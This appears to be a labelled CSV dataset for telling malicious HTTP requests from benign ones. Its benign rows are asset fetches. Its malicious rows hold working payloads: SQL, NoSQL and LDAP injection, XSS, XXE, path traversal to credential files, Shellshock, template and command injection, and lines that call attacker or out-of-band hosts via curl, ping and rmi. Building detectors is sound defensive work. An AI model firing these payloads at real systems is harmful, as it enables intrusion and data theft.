method,path,query,headers,body,ua,label
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, version(), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,/,ax--exec=`id`--remote=origin,,,,1
POST,/,,,"{""$gt"": """"}",,1
GET,/,/uploads/628668cae9db4d51b4edf55214b73fca-Facebook-Image.jpg?response-content-disposition=inline%3B%20filename%2A%3DUTF-8%27%276b67c704b68a4517aa6664c1df2f7afe&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=9wnmzzHYVGwlnTscRdzx%2F20260310%2F%2Fs3%2Faws4_request&X-Amz-Date=20260310T023341Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=5bfffbe1cc40d1ef12ee72b2126381daf34408143c87a1c0bf11e66c162e101b&q=%27or%201=1;--,,,,1
GET,"3;/* a */ DECLARE @c varchar(255);/* b */SELECT @c='ping '+master.sy s.fn_varbintohexstr(convert(varbinary,SYSTEM_USER))+'.000.burpco l'+'laborator.net';/*xx*/ EXEC Master.dbo.xp_cmdshell @c;/*xxx*/ EXE C sp_SYS_ProtoOp @id=3",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/assets/onerror.min.js,,,HTTP/1.1,,0
GET,/static/js/alert-menu-0fpuVvQL.css,,,HTTP/1.1,,0
GET,/build/union-row-TTntFPCk.png,,,HTTP/1.1,,0
GET,/,?selectPromotionId=986205&sku=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,,,1
GET,/,"""//Onx=""""//onfocus=prompt(1)>",,,,1
GET,/api/workspaces/insky/projects/bce0a79c-90d2-4558-9084-945ad6acbdae/issues/,group_by=state_id&order_by=-created_at&sub_issue=true&filters=%7B%22created_by_id__in%22:%22d5bfcc01-0096-4c85-a741-3309c3099472%22%7D&layout=kanban&cursor=30:0:0&per_page=30&xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=setInterval(%27fet%27+%27ch(document.domain)%27),,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/media/cat-dialog-DCdlL8Qi.svg,,,HTTP/1.1,,0
GET,"document[""cookie""]",,,,,1
GET,X-Forwarded-Host: attacker.com,,,,,1
GET,..\..\..\..\windows\system32\config\sam,,,,,1
GET,/,"(xss""><!--><svg/onload=alert(document.domain)>)",,,,1
GET,/static/js/whoami-clause-oK9Fb7xe.css,,,HTTP/1.1,,0
GET,/,?module=logging&file_name=../../../../../../~/.aws/credentials&number_of_lines=10000,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/assets/widget-where-F4euOsb5.svg,,,HTTP/1.1,,0
GET,/static/js/delete-handler-zFCemZNn.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/js/handler-alert-7W8CUJgy.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,/__proto__[v-if]=_c.constructor('alert(1)')(),,,,1
GET,/build/insert.js,,,HTTP/1.1,,0
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY data SYSTEM ""netdoc:/et c/passwd"">]><foo>&data;</foo>",,,,,1
GET,/static/js/tag-update-7jnmlqPt.js,,,HTTP/1.1,,0
GET,"data:text/html,<form action=https://127.0.0.1/xss-cp.php method=post ><input type=hidden name=a value=""<img/src=//127.0.0.1/yt.jpg onpoin terenter=alert`1`>""><input type=submit></form>",,,,,1
GET,/static/js/delete.min.js,,,HTTP/1.1,,0
GET,..\..\..\..\windows\system32\config\sam,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,id=1' OR '1'='1,,,,,1
GET,javascript:setInterval('con'+'firm(document.domain)'),,,,,1
POST,/,,,"{""__proto__"": {""isAdmin"": true}}",,1
GET,/,onerror=alert(1),,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/media/alert-function-SIYgoq7M.css,,,HTTP/1.1,,0
GET,/static/css/from.css,,,HTTP/1.1,,0
GET,/build/whoami.min.js,,,HTTP/1.1,,0
GET,/static/css/union.jpg,,,HTTP/1.1,,0
GET,/build/script.min.js,,,HTTP/1.1,,0
GET,/assets/button-onerror-Dwm4j112.png,,,HTTP/1.1,,0
GET,/assets/script-form-Emcatg52.svg,,,HTTP/1.1,,0
GET,/static/js/whoami.css,,,HTTP/1.1,,0
POST,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*","{""alg"":""RS256"",""kid"":""../../../../dev/null"",""typ"":""JWT""}",,1
GET,/static/js/insert.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/build/delete.svg,,,HTTP/1.1,,0
GET,/media/delete-type-yDCiqs30.png,,,HTTP/1.1,,0
GET,/assets/menu-union-PKnd9YV1.js,,,HTTP/1.1,,0
GET,"<iframe srcdoc=""<script>alert(1)</script>"">",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,Categories of Web Attacks (50 Categories),,,,,1
GET,"true, $where: '99 == 88'",,,,,1
GET,/build/onerror.jpg,,,HTTP/1.1,,0
GET,sometext<svg onload=alert(document.domain)>?mimeType=text/html,,,,,1
GET,/static/js/alert.min.js,,,HTTP/1.1,,0
GET,/,id=0x27204f52202731273d2731,,,,1
GET,/,?39844967af=javascript:setInterval%28%27con%27+%27firm%28document.domain%29%27%29,,,,1
GET,/js/components/AlertDialog.js,,,HTTP/1.1,,0
GET,/static/js/clause-select-qA4KhXi2.svg,,,HTTP/1.1,,0
GET,<body onload=alert('test1')>,,,,,1
GET,/,"""onClick=""(prompt)(1)",,,,1
,/,,,,,0
GET,<script>alert('XSS')</script>,,,,,1
GET,/media/update-widget-QV6kuP2j.jpg,,,HTTP/1.1,,0
GET,union select,,,,,1
GET,"<iframe srcdoc=""<script>alert(1)</script>"">",,,,,1
GET,/static/css/from-handler-TCKUN1QV.css,,,HTTP/1.1,,0
GET,/assets/script.js,,,HTTP/1.1,,0
POST,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*","{""alg"":""none""}",,1
GET,/media/script.svg,,,HTTP/1.1,,0
GET,rmi://attacker.com:1099/Exploit,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,| set /a 3482*7301,,,,,1
GET,/assets/row-onerror-k6sOtDdT.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,..%2f..%2f..%2fetc%2fshadow,,,,,1
GET,"/uploads/628668cae9db4d51b4edf55214b73fca-Facebook Image.jpg?response-content-disposition=inline%3B%20filename%2A%3DUTF-8%27%276b67c704b68a4517aa6664c1df2f7afe&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=9wnmzzHYVGwlnTscRdzx%2F20260310%2F%2Fs3%2Faws4_request&X-Amz-Date=20260310T023341Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=5bfffbe1cc40d1ef12ee72b2126381daf34408143c87a1c0bf11e66c162e101b&q=admin%27or%201=1;--""",,,,,1
GET,/assets/select.woff2,,,HTTP/1.1,,0
GET,/static/js/form-cat-Vu7ASd4y.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,<svg/onload=alert(=RND=)//,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,java\tscript:alert(1),,,,,1
GET,/static/js/onerror-tag-JKORcHGY.woff2,,,HTTP/1.1,,0
GET,/build/drop-zone-NsSxtOYf.svg,,,HTTP/1.1,,0
GET,1e1 union select users from password,,,,,1
GET,/media/insert.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/build/zone-cat-76INwn3A.png,,,HTTP/1.1,,0
GET,/static/js/from.jpg,,,HTTP/1.1,,0
GET,/media/from-zone-citB7iS0.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/css/union-handler-rwUgGitW.js,,,HTTP/1.1,,0
GET,/static/js/tag-cat-5yP4hsqS.woff2,,,HTTP/1.1,,0
POST,/,,,"{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,1
GET,/media/union-tag-Lkc2MHhC.css,,,HTTP/1.1,,0
GET,"() { :;}; echo ""NS:"" $(/usr/bin/id)",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/handler-select-bR2OHrTg.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/media/update-handler-JTI68QSA.woff2,,,HTTP/1.1,,0
GET,"Tarun~<""><details/open/ontoggle=""jAvAsCrIpT&colon;alert&lpar;/xss-by -tarun/&rpar;"">XXXXX</a>",,,,,1
GET,/,onerror=alert(1),,,,1
GET,/build/insert-tag-HsKXPR9C.jpg,,,HTTP/1.1,,0
GET,/media/alert.png,,,HTTP/1.1,,0
GET,/static/css/widget-select-ABEUAm7x.png,,,HTTP/1.1,,0
GET,/static/css/onerror.css,,,HTTP/1.1,,0
GET,"prompt.call(null,1)",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/assets/drop.css,,,HTTP/1.1,,0
GET,/,/&lt;svg/onload&equals;alert(1)&gt;,,,,1
GET,/,,,,,0
GET,"<iframe srcdoc=""<script>alert(1)</script>"">",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
POST,/,,,{{constructor.constructor('alert(1)')()}},,1
GET,/,id=0x27204f52202731273d2731,,,,1
GET,"<?xml version=""1.0"" encoding=""utf-8"" standalone=""no"" ?><x xmlns:xsi =""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""htt p://xxe-xsi-schemalocation.yourdomain[.]com/""/>",,,,,1
POST,/,,,{{7*7}} or {{config.items()}},,1
GET,/static/css/widget-from-7Pr3tX8t.png,,,HTTP/1.1,,0
GET,/media/union-icon-Ujdwifmz.woff2,,,HTTP/1.1,,0
GET,/,?34ea04b04c=%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E,,,,1
GET,/media/eval.svg,,,HTTP/1.1,,0
GET,query { __schema { types { name } } },,,,,1
GET,/static/js/drop-function-Bdss7hXx.woff2,,,HTTP/1.1,,0
GET,/,ax--exec=`id`--remote=origin,,,,1
GET,"<!ENTITY % payload SYSTEM ""file:///etc/passwd""> %payload;",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/build/image-where-enCyUgDV.png,,,HTTP/1.1,,0
GET,/media/drop.min.js,,,HTTP/1.1,,0
GET,/assets/clause-delete-R3s6jMzM.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,User-Agent: ' OR SLEEP(5) OR ',,,,,1
GET,id=1' OR '1'='1,,,,,1
GET,/media/whoami.js,,,HTTP/1.1,,0
GET,/media/select-menu-KKh6pK3Q.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/css/delete.min.js,,,HTTP/1.1,,0
GET,/media/insert-image-7sUPl1wL.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY data SYSTEM ""netdoc:/et c/passwd"">]><foo>&data;</foo>",,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/css/script.css,,,HTTP/1.1,,0
GET,/media/menu-delete-MDHewxN1.jpg,,,HTTP/1.1,,0
GET,/media/alert-type-xSqCLpwO.jpg,,,HTTP/1.1,,0
GET,/assets/alert.min.css,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/,<svg/onload=alert(=RND=)//,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/static/css/update-icon-rMhVY7a5.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/static/js/update-form-yXOlypTg.js,,,HTTP/1.1,,0
GET,"id=1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 0x7e)x FROM information_schema.tables GROUP BY x)a)--",,,,,1
GET,/assets/union.css,,,HTTP/1.1,,0
GET,%0d%0aSet-Cookie: session=attacker,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/handler-delete-zFCemZNn.png,,,HTTP/1.1,,0
GET,/static/js/drop.js,,,HTTP/1.1,,0
GET,/,|getent+hosts+somehost.burpcollaborator.net.&,,,,1
GET,/static/css/menu-whoami-poAxFN9x.js,,,HTTP/1.1,,0
GET,/static/js/delete.jpg,,,HTTP/1.1,,0
GET,|| ls -la,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,<body onload=alert(1)>,,,,,1
GET,/static/js/where.jpg,,,HTTP/1.1,,0
GET,cos\nsystem\n(S'id'\ntR.,,,,,1
GET,/media/update-widget-HE5CZSoy.svg,,,HTTP/1.1,,0
GET,/static/css/union.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/media/alert.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/media/button-onerror-rMvP3s7k.woff2,,,HTTP/1.1,,0
GET,/media/where.jpg,,,HTTP/1.1,,0
GET,/,&lt;svg/onload&equals;alert(1)&gt;,,,,1
GET,/static/js/select.min.css,,,HTTP/1.1,,0
GET,/assets/type-drop-lUyzPUXB.js,,,HTTP/1.1,,0
GET,; cat /etc/passwd,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,(&(uid=admin)(|(password=*))),,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
POST,/,,,"{""$gt"": """"}",,1
GET,/static/js/cat.min.js,,,HTTP/1.1,,0
GET,(alert)(1),,,,,1
GET,/media/drop-form-mTJk0M7J.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,http://attacker.com/shell.txt,,,,,1
GET,/,"/""onClick=""(prompt)(1)","User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/build/eval.min.js,,,HTTP/1.1,,0
GET,/build/alert.woff2,,,HTTP/1.1,,0
GET,expect://id,,,,,1
GET,/media/whoami-icon-hLeBFrpO.png,,,HTTP/1.1,,0
GET,"true, $where: '99 == 88'",,,,,1
GET,/assets/select.min.js,,,HTTP/1.1,,0
GET,javascript:setInterval('ale'+'rt(document.domain)'),,,,,1
GET,/,?4cbb3ffb50=3%3B%2F%2A%20a%20%2A%2F%20DECLARE%20@c%20varchar%28255%29%3B%2F%2A%20b%20%2A%2FSELECT%20@c=%27ping%20%27+master.sys.fn_varbintohexstr%28convert%28varbinary%2CSYSTEM_USER%29%29+%27.000.burpcol%27+%27laborator.net%27%3B%2F%2Axx%2A%2F%20EXEC%20Master.dbo.xp_cmdshell%20@c%3B%2F%2Axxx%2A%2F%20EXEC%20sp_SYS_ProtoOp%20@id=3,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/js/insert-date-yaTzm66z.svg,,,HTTP/1.1,,0
GET,/assets/alert-zone-6A9Bk0s8.css,,,HTTP/1.1,,0
GET,/static/js/whoami.min.js,,,HTTP/1.1,,0
GET,/media/delete.woff2,,,HTTP/1.1,,0
GET,/assets/drop.jpg,,,HTTP/1.1,,0
GET,/media/insert-menu-SflJ3qpp.svg,,,HTTP/1.1,,0
GET,/static/css/select-handler-MmZVMvea.woff2,,,HTTP/1.1,,0
GET,/,?selectPromotionId=986205&sku=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,,,1
GET,/static/js/whoami-image-KhgBVcGc.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/css/update-function-mZPKOQaD.woff2,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,Content-Length: 4\r\n\r\n1234,,,,,1
GET,/,?b87e1eadb1=sometext%3Csvg%20onload=alert%28document.domain%29%3E%3FmimeType=text%2Fhtml,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/whoami.js,,,HTTP/1.1,,0
GET,"id=1 UNION SELECT null, user(), database()--",,,,,1
GET,/build/from.png,,,HTTP/1.1,,0
GET,/,?de3c392736=&lt%3Bsvg%2Fonload&equals%3Balert%281%29&gt%3B,,,,1
GET,"http://lmb1ikpej3yys0gqft8lxewm2d89w5qtgh840sp.burpcollaborator.net/ 6.17.0.RELEASE iPhone12,8 iOS/14.5.1)) community-user-",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,adminDeviceSpaceId=131&format=%24%7b''.getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(''.getClass().forName('java.lang.Runtime')).exec('curl%20d6d5bt565jrc87ck692gzsym1em9spt3e.oast.me')%7d,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/assets/widget-where-d7H3ziID.woff2,,,HTTP/1.1,,0
GET,/static/js/onerror.min.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,id=1; SELECT pg_sleep(5)--,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/assets/onerror.css,,,HTTP/1.1,,0
GET,javascript:setInterval('con'+'firm(document.domain)'),,,,,1
GET,/static/js/update.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
POST,/,,,"{""$gt"": """"}",,1
GET,/,,,,,0
GET,/static/css/insert.png,,,HTTP/1.1,,0
GET,/,?selectPromotionId=986205&sku=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/js/delete.min.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/media/image-script-7aaVT1NH.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/script.min.js,,,HTTP/1.1,,0
GET,/build/image-drop-oAzZpcEV.png,,,HTTP/1.1,,0
GET,/,,,,,0
GET,/static/js/script.min.js,,,HTTP/1.1,,0
GET,<script>alert('XSS')</script>,,,,,1
GET,/static/js/eval-widget-Iz4PR4S6.js,,,HTTP/1.1,,0
